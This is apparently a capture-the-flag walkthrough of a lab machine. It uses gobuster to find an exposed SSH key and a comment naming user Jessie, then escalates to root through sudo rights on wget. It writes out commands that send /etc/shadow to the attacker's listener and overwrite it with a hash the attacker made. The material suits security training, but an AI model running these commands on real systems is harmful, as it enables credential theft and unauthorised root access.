# 10.10.129.234




gobuster the host-> we found /sitemap 
gobuster /sitemap -> we found .ssh which conaints a ssh key
check the source code of the page, we found this comment:
<!-- Jessie don't forget to udate the webiste -->


so now we have a user Jessie, and a key. we logged in via ssh and saw we have sudo access to wget
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/

download shadow file from wget:
sudo /usr/bin/wget --post-file=/etc/shadow <local-ip> 4444
	

change it's content:

- openssl passwd -6 -salt 'salt' 'password'
- $6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.

Move it to the server:

	client:
	python3 -m http.server

	server
	- sudo /usr/bin/wget 10.6.47.37:8000/shadow -O /etc/shadow


Then do "su -"  and switch to root.  

Lessons learned:

- always check the source code for clues
- always gobuster the site and the found pages
- learn how permissions work in linux


